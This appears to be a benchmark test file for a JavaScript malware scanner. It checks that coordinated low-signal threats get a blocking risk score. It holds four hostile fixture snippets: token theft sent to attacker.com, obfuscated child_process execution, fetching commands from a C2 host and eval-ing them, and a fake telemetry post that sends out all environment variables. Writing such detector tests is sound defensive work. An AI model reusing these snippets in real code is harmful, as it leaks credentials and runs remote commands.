/**
 * Sentinel 3.5.1: Low Signal Distributed Attack Benchmark
 * 
 * Tests the "Composite Risk Mode" against coordinated but individually weak threats.
 * Validates that diversity of intent (Surveillance, Evasion, Exfiltration, Execution)
 * triggers a Force Block (80+) even if no single signal is dominant.
 */

const { scanFile } = require('../src/ui/backend/scanner/index');

const BENCH_CASES = [
    {
        name: "CASE 1: Silent Exfiltration (env -> b64 -> fetch)",
        code: `
            const token = process.env.GITHUB_TOKEN;
            const payload = Buffer.from(token).toString('base64');
            require('https').request('https://attacker.com/collect?d=' + payload).end();
        `,
        expectedGroups: ['SURVEILLANCE', 'EVASION', 'EXFILTRATION']
    },
    {
        name: "CASE 2: Delayed Execution (locale -> dyn_req -> exec)",
        code: `
            if (Intl.DateTimeFormat().resolvedOptions().timeZone === 'Europe/Moscow') {
                const mod = 'child' + '_process';
                require(mod).exec('whoami');
            }
        `,
        expectedGroups: ['SURVEILLANCE', 'EVASION', 'EXECUTION']
    },
    {
        name: "CASE 3: Indirect C2 (fragmentation -> network -> eval)",
        code: `
            const a = 'ev'; const b = 'al';
            fetch('https://c2.com/cmd').then(r => r.text()).then(cmd => {
                global[a+b](cmd);
            });
        `,
        expectedGroups: ['EVASION', 'EXFILTRATION', 'EXECUTION']
    },
    {
        name: "CASE 4: Dev Tool Trojan (Telemetric Exfiltration)",
        code: `
            const os = require('os');
            const axios = require('axios');
            function reportMetrics() {
                const sysInfo = {
                    user: os.userInfo().username,
                    env: process.env,
                    platform: os.platform()
                };
                const data = Buffer.from(JSON.stringify(sysInfo)).toString('base64');
                axios.post('https://api-metrics-dev.com/v1/report', { data });
            }
            reportMetrics();
        `,
        expectedGroups: ['SURVEILLANCE', 'EVASION', 'EXFILTRATION']
    }
];

console.log("=== SENTINEL LOW-SIGNAL BENCH v3.5.1 ===");
console.log("- Testing Composite Risk Model (Offensive Behavior Analysis)\n");

let allPassed = true;

BENCH_CASES.forEach((c, idx) => {
    const results = scanFile(`low_signal_${idx+1}.js`, c.code);
    
    // Find the adaptive engine alert
    const adaptiveAlert = results.alerts.find(a => a.ruleName.includes('Adaptive Engine'));
    const score = adaptiveAlert ? adaptiveAlert.riskLevel : 0;
    
    const isBlocked = score >= 80;
    
    console.log(`[${c.name}]`);
    console.log(`  - Score: ${score}/100`);
    console.log(`  - Status: ${isBlocked ? '✅ BLOCKED' : '❌ BYPASSED'}`);
    
    if (adaptiveAlert && adaptiveAlert.evidence) {
        const matches = adaptiveAlert.evidence.match(/\[ (.*) \]/);
        if (matches) console.log(`  - Chain: ${matches[1]}`);
    }

    if (!isBlocked) {
        allPassed = false;
        console.log("  ⚠️  CRITICAL: Low signal attack escaped composite detection!");
    }
    console.log("");
});

console.log("-".repeat(40));
if (allPassed) {
    console.log("✅ RESULT: PASS (All distributed threats blocked via Composite Risk Mode)");
    process.exit(0);
} else {
    console.error("❌ RESULT: FAIL (Engine underfitting detected)");
    process.exit(1);
}
